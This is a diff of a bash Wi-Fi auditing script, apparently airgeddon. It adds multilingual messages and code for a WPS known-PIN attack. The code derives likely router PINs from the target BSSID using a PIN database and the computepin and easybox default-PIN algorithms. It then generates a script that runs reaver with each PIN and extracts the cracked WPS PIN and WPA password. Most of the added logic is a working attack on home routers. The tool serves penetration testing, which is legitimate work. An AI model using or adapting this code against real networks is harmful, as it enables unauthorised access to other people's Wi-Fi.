 	arr["RUSSIAN",368]="У вас установлен bully (v${bully_version}). Версия удовлетворяет требованиям для проведения интегрированной в bully атаки Pixie Dust (минимальная версия v${minimum_bully_pixiewps_version}). Скрипт может продолжить работу..."
 	arr["GREEK",368]="Έχετε εγκατεστημένο το bully (v${bully_version}). Έχετε την απαραίτητη έκδοση bully (ελάχιστη έκδοση v${minimum_bully_pixiewps_version}), για την επίθεση Pixie Dust με ενσωματωμένο bully. Το script μπορεί να συνεχίσει..."
@@ -3440,7 +3444,7 @@ function language_strings() {
 	arr["ENGLISH",369]="To perform the Pixie Dust integrated attack with reaver or bully, you must have installed at least ${minimum_reaver_pixiewps_version} version for reaver and ${minimum_bully_pixiewps_version} for bully"
 	arr["SPANISH",369]="Para realizar el ataque Pixie Dust integrado con reaver o con bully, has de tener instalada como mínimo la versión ${minimum_reaver_pixiewps_version} para reaver y ${minimum_bully_pixiewps_version} para bully"
 	arr["FRENCH",369]="Les versions minimales requises de reaver et bully pour l'attaque pixie wps sont reaver ${minimum_reaver_pixiewps_version} et bully ${minimum_bully_pixiewps_version}"
-	arr["CATALAN",369]="${pending_of_translation} Per realitzar l'atac Pixie Dust integrat amb reaver o amb bully, has de tenir instal·lada com a mínim la versió ${minimum_reaver_pixiewps_version} per reaver i ${minimum_bully_pixiewps_version} per bully"
+	arr["CATALAN",369]="Per realitzar l'atac Pixie Dust integrat amb reaver o amb bully, has de tenir instal·lada com a mínim la versió ${minimum_reaver_pixiewps_version} per reaver i ${minimum_bully_pixiewps_version} per bully"
 	arr["PORTUGUESE",369]="Para executar o ataque Pixie Dust com reaver ou bully, é necessário ter instalado pelo menos a versão ${minimum_reaver_pixiewps_version} para o reaver e ${minimum_bully_pixiewps_version} para o bully"
 	arr["RUSSIAN",369]="Для выполнения интегрированной атаки Pixie Dust с reaver или bully, у вас должна быть установлена, по крайней мере, версия ${minimum_reaver_pixiewps_version} для reaver и ${minimum_bully_pixiewps_version} для bully"
 	arr["GREEK",369]="Για να κάνετε την επίθεση Pixie Dust με ενσωματωμένο reaver ή bully, θα πρέπει να έχετε εγκαταστημένη τουλάχιστον την έκδοση ${minimum_reaver_pixiewps_version} για reaver και ${minimum_bully_pixiewps_version} για bully"
@@ -3448,7 +3452,7 @@ function language_strings() {
 	arr["ENGLISH",370]="You have reaver installed (v${reaver_version}). You meet the version requirement to perform Pixie Dust integrated reaver attack (minimum version v${minimum_reaver_pixiewps_version}). Script can continue..."
 	arr["SPANISH",370]="Tienes reaver instalado (v${reaver_version}). Cumples con el requisito de versión para realizar el ataque Pixie Dust integrado con reaver (versión minima v${minimum_reaver_pixiewps_version}). El script puede continuar..."
 	arr["FRENCH",370]="Reaver est installé (v${reaver_version}). Cette version est compatible avec l'attaque pixie dust (version minimale: ${minimum_reaver_pixiewps_version}). Le script peut continuer..."
-	arr["CATALAN",370]="${pending_of_translation} Tens reaver instal·lat (v${reaver_version}). Compleixes amb el requisit de versió per a realitzar l'atac Pixie Dust integrat amb reaver (versió mínima v${minimum_reaver_pixiewps_version}). El script pot continuar..."
+	arr["CATALAN",370]="Tens reaver instal·lat (v${reaver_version}). Compleixes amb el requisit de versió per a realitzar l'atac Pixie Dust integrat amb reaver (versió mínima v${minimum_reaver_pixiewps_version}). El script pot continuar..."
 	arr["PORTUGUESE",370]="Você tem o reaver instalado (v${reaver_version}). Você cumpre a exigência de versão para o ataque Pixie Dust com reaver (versão mínima v${minimum_reaver_pixiewps_version}). O script pode continuar..."
 	arr["RUSSIAN",370]="У вас установлен reaver (v${reaver_version}). Версия удовлетворяет требованиям для выполнения интегрированной в reaver атаки Pixie Dust (минимальная версия v${minimum_reaver_pixiewps_version}). Скрипт может продолжить работу..."
 	arr["GREEK",370]="Έχετε εγκατεστημένο το reaver (v${reaver_version}). Έχετε την απαραίτητη έκδοση reaver (ελάχιστη έκδοση v${minimum_reaver_pixiewps_version}), για την επίθεση Pixie Dust με ενσωματωμένο reaver. Το script μπορεί να συνεχίσει..."
@@ -3456,7 +3460,7 @@ function language_strings() {
 	arr["ENGLISH",371]="You have reaver installed (v${reaver_version}), but not required version. To perform Pixie Dust integrated reaver attack you must have at least version v${minimum_reaver_pixiewps_version}"
 	arr["SPANISH",371]="Tienes reaver instalado (v${reaver_version}), aunque no la versión requerida. Para realizar el ataque Pixie Dust integrado con reaver has de tener al menos la versión v${minimum_reaver_pixiewps_version}"
 	arr["FRENCH",371]="Reaver est installé (v${reaver_version}) mais cette version n'est pas compatible avec l'attaque pixie dust. Version minimale requise: v${minimum_reaver_pixiewps_version}"
-	arr["CATALAN",371]="${pending_of_translation} Tens reaver instal·lat (v${reaver_version}), encara que no la versió requerida. Per realitzar l'atac Pixie Dust integrat amb reaver has de tenir almenys la versió v${minimum_reaver_pixiewps_version}"
+	arr["CATALAN",371]="Tens reaver instal·lat (v${reaver_version}), encara que no és la versió requerida. Per realitzar l'atac Pixie Dust integrat amb reaver has de tenir almenys la versió v${minimum_reaver_pixiewps_version}"
 	arr["PORTUGUESE",371]="Você tem o reaver instalado (v${reaver_version}), mas não a versão necessária. Para fazer o ataque reaver integrado Pixie Dust tem que ter pelo menos a versão v${minimum_reaver_pixiewps_version}"
 	arr["RUSSIAN",371]="У вас установлен reaver (v${reaver_version}), но не та версия, которая требуется. Для выполнения интегрированной в reaver атаки Pixie Dust у вас должна быть по крайней мере v${minimum_reaver_pixiewps_version}"
 	arr["GREEK",371]="Έχετε εγκατεστημένο το reaver (v${reaver_version}), αλλά όχι την απαιτούμενη έκδοση. Για να κάνετε την επίθεση Pixie Dust με ενσωματωμένο reaver θα πρέπει να έχετε τουλάχιστον την έκδοση v${minimum_reaver_pixiewps_version}"
@@ -3557,6 +3561,62 @@ function language_strings() {
 	arr["RUSSIAN",383]="${pending_of_translation} Кажется, есть файл базы данных PINs более последнюю дату. Он будет загружен..."
 	arr["GREEK",383]="${pending_of_translation} Φαίνεται ότι υπάρχει ένα αρχείο κωδικών PINs της βάσης δεδομένων πιο up-to-ημερομηνία. Θα κατέβει..."
 
+	arr["ENGLISH",384]="Searching in PINs database. Please be patient..."
+	arr["SPANISH",384]="Buscando en la base de datos de PINs. Por favor ten paciencia..."
+	arr["FRENCH",384]="${pending_of_translation} Recherche des codes PIN de base de données. Soyez patients s'il vous plaît..."
+	arr["CATALAN",384]="${pending_of_translation} Buscant a la base de dades de PINs. Si us plau té paciència..."
+	arr["PORTUGUESE",384]="${pending_of_translation} Pesquisando os PINs de banco de dados. Por favor, seja paciente..."
+	arr["RUSSIAN",384]="${pending_of_translation} Поиск в базе данных PINs. Додождите немного..."
+	arr["GREEK",384]="${pending_of_translation} Ψάχνοντας στη βάση δεδομένων κωδικών PINs. Παρακαλώ κάντε υπομονή..."
+
+	arr["ENGLISH",385]="Only one match found in the PINs database"
+	arr["SPANISH",385]="Se ha encontrado sólo una coincidencia en la base de datos de PINs"
+	arr["FRENCH",385]="${pending_of_translation} Seulement trouvé une correspondance dans les PINs de base de données"
+	arr["CATALAN",385]="${pending_of_translation} S'ha trobat només una coincidència a la base de dades de PINs"
+	arr["PORTUGUESE",385]="${pending_of_translation} Só encontrei um jogo nas PINs de banco de dados"
+	arr["RUSSIAN",385]="${pending_of_translation} Только один матч найден в базе данных PINs"
+	arr["GREEK",385]="${pending_of_translation} Μόνο ένας αγώνας που βρέθηκαν στη βάση δεδομένων κωδικών PINs"
+
+	arr["ENGLISH",386]="${counter_pins_found} matching PINs have been found in the PINs database"
+	arr["SPANISH",386]="Se han encontrado ${counter_pins_found} PINs coincidentes en la base de datos de PINs"
+	arr["FRENCH",386]="${pending_of_translation} Trouvé ${counter_pins_found} PINs correspondant dans les PINs de base de données"
+	arr["CATALAN",386]="${pending_of_translation} S'han trobat ${counter_pins_found} PINs coincidents a la base de dades de PINs"
+	arr["PORTUGUESE",386]="${pending_of_translation} Encontrados ${counter_pins_found} PINs correspondentes nas PINs de banco de dados"
+	arr["RUSSIAN",386]="${pending_of_translation} ${counter_pins_found} соответствие ПИНы были найдены в базе данных PINs"
+	arr["GREEK",386]="${pending_of_translation} ${counter_pins_found} ταιριάζουν τα PINs έχουν βρεθεί στη βάση δεδομένων κωδικών PINs"
+
+	arr["ENGLISH",387]="No matches found in the PINs database"
+	arr["SPANISH",387]="No se ha encontrado ninguna coincidencia en la base de datos de PINs"
+	arr["FRENCH",387]="${pending_of_translation} Rien trouvé aucune correspondance dans les PINs de base de données"
+	arr["CATALAN",387]="${pending_of_translation} No s'ha trobat cap coincidència a la base de dades de PINs"
+	arr["PORTUGUESE",387]="${pending_of_translation} Nada encontrado nenhum fósforo nas PINs de banco de dados"
+	arr["RUSSIAN",387]="${pending_of_translation} Нет совпадений найдено в базе данных PINs"
+	arr["GREEK",387]="${pending_of_translation} Δεν βρέθηκαν στη βάση δεδομένων κωδικών PINs αγώνες"
+
+	arr["ENGLISH",388]="Calculating and adding possible PINs using common known algorithms..."
+	arr["SPANISH",388]="Calculando y añadiendo posibles PINs usando algoritmos conocidos comunes..."
+	arr["FRENCH",388]="${pending_of_translation} Le calcul et l'ajout de PINs possibles en utilisant des algorithmes connus communs..."
+	arr["CATALAN",388]="${pending_of_translation} Calculant i afegint possibles PINs usant algoritmes coneguts comuns..."
+	arr["PORTUGUESE",388]="${pending_of_translation} Cálculo e adicionando possíveis PINs usando algoritmos conhecidos comuns..."
+	arr["RUSSIAN",388]="${pending_of_translation} Вычисление и добавление возможных PINs с использованием обычных известных алгоритмов..."
+	arr["GREEK",388]="${pending_of_translation} Υπολογισμού και προσθέτοντας το δυνατόν τα PINs χρήση κοινών γνωστών αλγορίθμων..."
+
+	arr["ENGLISH",389]="PINs calculated by algorithms have been added. The attack will be launched with a total of ${counter_pins_found} PINs"
+	arr["SPANISH",389]="Se han añadido PINs calculados por los algoritmos. El ataque se lanzará con un total de ${counter_pins_found} PINs"
+	arr["FRENCH",389]="${pending_of_translation} Ils ont été ajoutés PINs calculées au moyen d'algorithmes. L'attaque sera lancée avec un total de ${counter_pins_found} PINs"
+	arr["CATALAN",389]="${pending_of_translation} S'han afegit PINs calculats pels algoritmes. L'atac es llançarà amb un total de ${counter_pins_found} PINs"
+	arr["PORTUGUESE",389]="${pending_of_translation} Eles foram adicionados PINs calculados por algoritmos. O ataque será lançado com um total de ${counter_pins_found} PINs"
+	arr["RUSSIAN",389]="${pending_of_translation} PINs, рассчитанные с помощью алгоритмов, которые были добавлены. Атака будет запущен в общей сложности ${counter_pins_found} PINs"
+	arr["GREEK",389]="${pending_of_translation} Οι αριθμοί PINs που υπολογίζονται από αλγόριθμους έχουν προστεθεί. Η επίθεση θα ξεκινήσει με συνολικά ${counter_pins_found} κωδικών PINs"
+
+	arr["ENGLISH",390]="Some access points have PBC (Push Button Connect) enabled and you can't connect via WPS if you don't press the physical button on the device"
+	arr["SPANISH",390]="Algunos puntos de acceso tienen activado PBC (Push Button Connect) y no podras conectar por WPS si no se pulsa el boton físico del mismo"
+	arr["FRENCH",390]="${pending_of_translation} Certains points d'accès ont permis PBC (Push Button Connect) et vous ne pouvez pas vous connecter via WPS si le même bouton physique est pressé"
+	arr["CATALAN",390]="${pending_of_translation} Alguns punts d'accés tenen activat PBC (Push Button Connect) i no podràs connectar per WPS si no es prem el botó físic de la mateixa"
+	arr["PORTUGUESE",390]="${pending_of_translation} Alguns pontos de acesso têm permitido PBC (Push Button Connect) e você não pode se conectar via WPS se o mesmo botão físico é pressionado"
+	arr["RUSSIAN",390]="${pending_of_translation} Некоторые точки доступа имеют PBC (Push Button Connect) включен, и вы не можете подключиться через WPS, если вы не нажмете на физическую кнопку на устройстве"
+	arr["GREEK",390]="${pending_of_translation} Μερικά σημεία πρόσβασης έχουν PBC (Push Button Connect) είναι ενεργοποιημένη και δεν μπορείτε να συνδεθείτε μέσω WPS αν δεν πατήσετε το φυσικό κουμπί στη συσκευή"
+
 	case "${3}" in
 		"yellow")
 			interrupt_checkpoint "${2}" "${3}"
@@ -3576,6 +3636,9 @@ function language_strings() {
 		;;
 		"pink")
 			echo_pink "${arr[${1},${2}]}"
+		;;
+		"white")
+			echo_white "${arr[${1},${2}]}"
 		;;
 		"title")
 			generate_dynamic_line "${arr[${1},${2}]}" "title"
@@ -3809,6 +3872,147 @@ function check_interface_coherence() {
 	fi
 
 	return ${interface_auto_change}
+}
+
+#Prepare the vars to be used on wps pin database attacks
+function set_wps_mac_parameters() {
+
+	six_wpsbssid_first_digits=${wps_bssid:0:8}
+	six_wpsbssid_first_digits_clean=${six_wpsbssid_first_digits//:}
+	six_wpsbssid_last_digits=${wps_bssid: -8}
+	six_wpsbssid_last_digits_clean=${six_wpsbssid_last_digits//:}
+	four_wpsbssid_last_digits=${wps_bssid: -5}
+	four_wpsbssid_last_digits_clean=${four_wpsbssid_last_digits//:}
+}
+
+#Calculate pin based on Zhao Chunsheng algorithm (computepin), step 1
+function calculate_computepin_algorithm_step1() {
+
+	hex_to_dec=$(printf '%d\n' 0x"${six_wpsbssid_last_digits_clean}") 2> /dev/null
+	computepin_pin=$((hex_to_dec % 10000000))
+}
+
+#Calculate pin based on Zhao Chunsheng algorithm (computepin), step 2
+function calculate_computepin_algorithm_step2() {
+
+	computepin_pin=$(printf '%08d\n' $((10#${computepin_pin} * 10 + checksum_digit)))
+}
+
+#Calculate pin based on Stefan Viehböck algorithm (easybox)
+function calculate_easybox_algorithm() {
+
+	hex_to_dec=($(printf "%04d" "0x${four_wpsbssid_last_digits_clean}" | sed 's/.*\(....\)/\1/;s/./& /g'))
+	[[ ${four_wpsbssid_last_digits_clean} =~ ${four_wpsbssid_last_digits_clean//?/(.)} ]] && hexi=($(printf '%s\n' "${BASH_REMATCH[*]:1}"))
+
+	c1=$(printf "%d + %d + %d + %d" "${hex_to_dec[0]}" "${hex_to_dec[1]}" "0x${hexi[2]}" "0x${hexi[3]}")
+	c2=$(printf "%d + %d + %d + %d" "0x${hexi[0]}" "0x${hexi[1]}" "${hex_to_dec[2]}" "${hex_to_dec[3]}")
+
+	K1=$((c1 % 16))
+	K2=$((c2 % 16))
+	X1=$((K1 ^ hex_to_dec[3]))
+	X2=$((K1 ^ hex_to_dec[2]))
+	X3=$((K1 ^ hex_to_dec[1]))
+	Y1=$((K2 ^ 0x${hexi[1]}))
+	Y2=$((K2 ^ 0x${hexi[2]}))
+	Z1=$((0x${hexi[2]} ^ hex_to_dec[3]))
+	Z2=$((0x${hexi[3]} ^ hex_to_dec[2]))
+
+	easybox_pin=$(printf '%08d\n' "$((0x$X1$X2$Y1$Y2$Z1$Z2$X3))" | rev | cut -c -7 | rev)
+}
+
+#Calculate the last digit on pin following the checksum rule
+function pin_checksum_rule() {
+
+	current_calculated_pin=$((10#${1} * 10))
+
+	accum=0
+	accum=$((accum + 3 * (current_calculated_pin/10000000 % 10)))
+	accum=$((accum + current_calculated_pin/1000000 % 10))
+	accum=$((accum + 3 * (current_calculated_pin/100000 % 10)))
+	accum=$((accum + current_calculated_pin/10000 % 10))
+	accum=$((accum + 3 * (current_calculated_pin/1000 % 10)))
+	accum=$((accum + current_calculated_pin/100 % 10))
+	accum=$((accum + 3 * (current_calculated_pin/10 % 10)))
+
+	control_digit=$((accum % 10))
+	checksum_digit=$((10 - control_digit))
+	checksum_digit=$((checksum_digit % 10))
+}
+
+#Manage the calls to check common wps pin algorithms
+function check_and_set_common_algorithms() {
+
+	echo
+	language_strings "${language}" 388 "blue"
+	declare -g calculated_pins=("${wps_default_generic_pin}")
+
+	calculate_computepin_algorithm_step1
+	pin_checksum_rule "${computepin_pin}"
+	calculate_computepin_algorithm_step2
+	calculated_pins+=("${computepin_pin}")
+
+	calculate_easybox_algorithm
+	pin_checksum_rule "${easybox_pin}"
+	easybox_pin=$(printf '%08d\n' $((current_calculated_pin + checksum_digit)))
+	calculated_pins+=("${easybox_pin}")
+
+	integrate_algorithms_pins
+	if [ "$?" = "0" ]; then
+		echo
+		language_strings "${language}" 389 "yellow"
+	fi
+}
+
+#Integrate calculated pins from algorithms into pins array
+function integrate_algorithms_pins() {
+
+	some_calculated_pin_included=0
+	for pin in "${calculated_pins[@]}"; do
+		this_pin_already_included=0
+		for item in "${pins_found[@]}"; do
+			if [ "${item}" = "${pin}" ]; then
+				this_pin_already_included=1
+				break
+			fi
+		done
+
+		if [ ${this_pin_already_included} -eq 0 ]; then
+			pins_found+=(${pin})
+			counter_pins_found=$((counter_pins_found + 1))
+			some_calculated_pin_included=1
+		fi
+	done
+
+	if [ "${some_calculated_pin_included}" -eq 1 ]; then
+		return 0
+	fi
+	return 1
+}
+
+#Include the code of the pin database file
+function include_pin_dbfile() {
+
+	dbfile_to_include="source \"${scriptfolder}${known_pins_dbfile}\""
+	eval "${dbfile_to_include}"
+}
+
+#Search for target wps bssid mac in pin database and set the vars to be used
+function search_in_pin_database() {
+
+	bssid_found_in_db=0
+	counter_pins_found=0
+	declare -g pins_found=()
+	for item in "${!PINDB[@]}"; do
+		if [ "${item}" = "${six_wpsbssid_first_digits_clean}" ]; then
+			bssid_found_in_db=1
+			arrpins=(${PINDB[${item//[[:space:]]/ }]})
+			for item2 in "${arrpins[@]}"; do
+				counter_pins_found=$((counter_pins_found+1))
+				pins_found+=(${item2})
+			done
+			break
+		fi
+	done
 }
 
 #Prepare monitor mode avoiding the use of airmon-ng or airmon-zc generating two interfaces from one
@@ -4467,6 +4671,17 @@ function exec_wps_bruteforce_pin_reaver_attack() {
 	xterm -hold -bg black -fg red -geometry "${g2_stdleft_window}" -T "WPS bruteforce pin reaver attack" -e "reaver -i ${interface} -b ${wps_bssid} -c ${wps_channel} -L -f -n -a -vvv && echo \"Close this window\"" > /dev/null 2>&1
 }
 
+#Execute wps pin database reaver attack
+function exec_wps_pin_database_reaver_attack() {
+
+	wps_pin_database_prerequisites
+
+	set_wps_attack_script "reaver" "pindb"
+
+	recalculate_windows_sizes
+	xterm -hold -bg black -fg red -geometry "${g2_stdright_window}" -T "WPS reaver known pins database based attack" -e "bash \"${tmpdir}${wps_attack_script_file}\"" > /dev/null 2>&1
+}
+
 #Execute mdk3 deauth DoS attack
 function exec_mdk3deauth() {
 
@@ -4692,8 +4907,8 @@ function wps_custom_pin_parameters() {
 	return 0
 }
 
-#Validate wps pixie dust and bruteforce parameters
-function wps_pixie_dust_and_bruteforce_parameters() {
+#Validate wps parameters for pixie dust, bruteforce and pin database attacks
+function wps_standard_attacks_parameters() {
 
 	check_monitor_enabled
 	if [ "$?" != "0" ]; then
@@ -4980,6 +5195,8 @@ function clean_tmpfiles() {
 		rm -rf "${dhcp_path}" > /dev/null 2>&1
 	fi
 	rm -rf "${tmpdir}wps"* > /dev/null 2>&1
+	rm -rf "${tmpdir}${wps_attack_script_file}" > /dev/null 2>&1
+	rm -rf "${tmpdir}${wps_out_file}" > /dev/null 2>&1
 }
 
 #Clean firewall rules and restore orginal routing state
@@ -5369,7 +5586,7 @@ function wps_attacks_menu() {
 					echo
 					language_strings "${language}" 368 "yellow"
 					language_strings "${language}" 115 "read"
-					wps_pixie_dust_and_bruteforce_parameters
+					wps_standard_attacks_parameters
 					if [ "$?" = "0" ]; then
 						exec_bully_pixiewps_attack
 					fi
@@ -5391,7 +5608,7 @@ function wps_attacks_menu() {
 					echo
 					language_strings "${language}" 370 "yellow"
 					language_strings "${language}" 115 "read"
-					wps_pixie_dust_and_bruteforce_parameters
+					wps_standard_attacks_parameters
 					if [ "$?" = "0" ]; then
 						exec_reaver_pixiewps_attack
 					fi
@@ -5409,7 +5626,7 @@ function wps_attacks_menu() {
 			else
 				get_bully_version
 				set_bully_verbosity
-				wps_pixie_dust_and_bruteforce_parameters
+				wps_standard_attacks_parameters
 				if [ "$?" = "0" ]; then
 					exec_wps_bruteforce_pin_bully_attack
 				fi
@@ -5421,7 +5638,7 @@ function wps_attacks_menu() {
 				forbidden_menu_option
 			else
 				get_reaver_version
-				wps_pixie_dust_and_bruteforce_parameters
+				wps_standard_attacks_parameters
 				if [ "$?" = "0" ]; then
 					exec_wps_bruteforce_pin_reaver_attack
 				fi
@@ -5459,7 +5676,10 @@ function wps_attacks_menu() {
 					language_strings "${language}" 379 "blue"
 				fi
 				language_strings "${language}" 115 "read"
-				#TODO start validations and attack
+				wps_standard_attacks_parameters
+				if [ "$?" = "0" ]; then
+					exec_wps_pin_database_reaver_attack
+				fi
 			fi
 		;;
 		13)
@@ -6524,6 +6744,161 @@ function exec_et_deauth() {
 	esac
 	xterm -hold -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth" -e "${deauth_et_cmd}" > /dev/null 2>&1 &
 	et_processes+=($!)
+	sleep 1
+}
+
+#Create here-doc bash script used for wps pin attacks
+function set_wps_attack_script() {
+
+	tmpfiles_toclean=1
+	rm -rf "${tmpdir}${wps_attack_script_file}" > /dev/null 2>&1
+	rm -rf "${tmpdir}${wps_out_file}" > /dev/null 2>&1
+
+	exec 7>"${tmpdir}${wps_attack_script_file}"
+
+	wps_attack_tool="${1}"
+	wps_attack_mode="${2}"
+	if [ "${wps_attack_tool}" = "reaver" ]; then
+
+		case ${wps_attack_mode} in
+			"pindb")
+				attack_cmd1="reaver -i \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} -L -f -n -a -g 1 -d 2 -vvv -p "
+			;;
+			#"custompin")
+				#TODO pending
+			#;;
+			#"pixiedust")
+				#TODO pending
+			#;;
+			#"bruteforce")
+			#	#TODO pending
+			#;;
+		esac
+	#else
+		#TODO pending for bully
+		#case ${wps_attack_mode} in
+			#"pindb")
+			#	#TODO pending
+			#;;
+			#"custompin")
+				#TODO pending
+			#;;
+			#"pixiedust")
+				#TODO pending
+			#;;
+			#"bruteforce")
+			#	#TODO pending
+			#;;
+		#esac
+	fi
+
+	attack_cmd2=" | tee \"${tmpdir}${wps_out_file}\""
+
+	cat >&7 <<-EOF
+		#!/bin/bash
+		script_wps_attack_tool="${wps_attack_tool}"
+		script_wps_attack_mode="${wps_attack_mode}"
+		attack_pin_counter=1
+	EOF
+
+	cat >&7 <<-'EOF'
+		if [ "${script_wps_attack_mode}" = "pindb" ]; then
+	EOF
+
+	cat >&7 <<-EOF
+			script_pins_found=(${pins_found[@]})
+		fi
+
+		pin_header1="${white_color}Testing PIN "
+		pin_header2=" (${yellow_color}"
+		pin_header3="${white_color})${normal_color}"
+		script_interface="${interface}"
+		script_wps_bssid="${wps_bssid}"
+		script_wps_channel="${wps_channel}"
+		script_attack_cmd1="${attack_cmd1}"
+		script_attack_cmd2="${attack_cmd2}"
+
+		#Parse the output file generated by the attack
+		function parse_output() {
+
+			readarray -t LINES_TO_PARSE < <(cat < "${tmpdir}${wps_out_file}" 2> /dev/null)
+	EOF
+
+	cat >&7 <<-'EOF'
+			if [ "${script_wps_attack_tool}" = "reaver" ]; then
+				failed_attack_regexp="^\[!\][[:space:]]WPS[[:space:]]transaction[[:space:]]failed"
+				success_attack_badpin_regexp="^\[\-\][[:space:]]Failed[[:space:]]to[[:space:]]recover[[:space:]]WPA[[:space:]]key"
+				success_attack_goodpin_regexp="^\[\+\][[:space:]]Pin[[:space:]]cracked"
+				pin_cracked_regexp="^\[\+\][[:space:]]WPS[[:space:]]PIN:[[:space:]]'([0-9]{8})'"
+				password_cracked_regexp="^\[\+\][[:space:]]WPA[[:space:]]PSK:[[:space:]]'(.*)'"
+			#else
+				#TODO pending regexp for bully
+			fi
+
+				for item in "${LINES_TO_PARSE[@]}"; do
+					if [[ ${item} =~ ${success_attack_goodpin_regexp} ]] || [[ ${pin_cracked} -eq 1 ]]; then
+						if [[ ${item} =~ ${pin_cracked_regexp} ]]; then
+							cracked_pin="${BASH_REMATCH[1]}"
+							continue
+						elif [[ ${item} =~ ${password_cracked_regexp} ]]; then
+							cracked_password="${BASH_REMATCH[1]}"
+							return 0
+						fi
+						pin_cracked=1
+						continue
+					elif [[ ${item} =~ ${success_attack_badpin_regexp} ]]; then
+						return 2
+					elif [[ ${item} =~ ${failed_attack_regexp} ]]; then
+						return 1
+					fi
+				done
+		}
+
+		pin_cracked=0
+		if [ "${script_wps_attack_mode}" = "pindb" ]; then
+			for current_pin in "${script_pins_found[@]}"; do
+				clear
+				bad_attack_this_pin_counter=0
+				echo
+				echo -e "${pin_header1}${current_pin}${pin_header2}${attack_pin_counter}/${#script_pins_found[@]}${pin_header3}"
+				eval "${script_attack_cmd1}${current_pin}${script_attack_cmd2}"
+				attack_pin_counter=$((attack_pin_counter + 1))
+				parse_output
+				if [ "$?" = "0" ]; then
+					break
+				elif [ "$?" = "1" ]; then
+					bad_attack_this_pin_counter=$((bad_attack_this_pin_counter + 1))
+					if [ ${bad_attack_this_pin_counter} -eq 3 ]; then
+						continue
+					fi
+				fi
+				sleep 1.5
+			done
+		#else
+			#TODO pending
+		fi
+
+		if [ ${pin_cracked} -eq 1 ]; then
+	EOF
+
+	cat >&7 <<-EOF
+			echo
+			pin_cracked_msg="${white_color}PIN cracked: "
+			password_cracked_msg="${white_color}Password cracked: "
+	EOF
+
+	cat >&7 <<-'EOF'
+			echo -e "${pin_cracked_msg}${cracked_pin}"
+			echo -e "${password_cracked_msg}${cracked_password}"
+		fi
+	EOF
+
+	cat >&7 <<-EOF
+		echo
+		echo -e "${white_color}Close this window"
+	EOF
+
+	exec 7>&-
 	sleep 1
 }
 
@@ -8031,6 +8406,31 @@ function set_wash_parametrization() {
 	done
 
 	wash_ifaces_already_set[${interface}]=${fcs}
+}
+
+#Manage and validate the prerequisites for wps pin database attacks
+function wps_pin_database_prerequisites() {
+
+	set_wps_mac_parameters
+	include_pin_dbfile
+	echo
+	language_strings "${language}" 384 "blue"
+	echo
+	search_in_pin_database
+	if [ ${bssid_found_in_db} -eq 1 ]; then
+		if [ ${counter_pins_found} -eq 1 ]; then
+			language_strings "${language}" 385 "yellow"
+		else
+			language_strings "${language}" 386 "yellow"
+		fi
+	else
+		language_strings "${language}" 387 "yellow"
+	fi
+
+	check_and_set_common_algorithms
+	echo
+	language_strings "${language}" 366 "blue"
+	language_strings "${language}" 4 "read"
 }
 
 #Manage and validate the prerequisites for Evil Twin attacks
@@ -9680,6 +10080,12 @@ function echo_cyan() {
 function echo_brown() {
 
 	last_echo "${1}" "${brown_color}"
+}
+
+#Print white messages
+function echo_white() {
+
+	last_echo "${1}" "${white_color}"
 }
 
 trap capture_traps INT
